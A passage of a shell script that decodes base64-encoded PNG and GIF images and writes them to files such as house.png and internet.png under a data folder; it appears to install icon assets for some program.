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
rkJggg==" | base64 --decode>$DUMP_PATH/data/house.png

echo "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" | base64 --decode>$DUMP_PATH/data/internet.png

echo "R0lGODlhFAAKAMQQAMDP2J20w+3x9IKfsuTq7snW3q/BzoumuKa6yPb4+dLc45StvbfI03mYrdvj
6XCRp////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEA
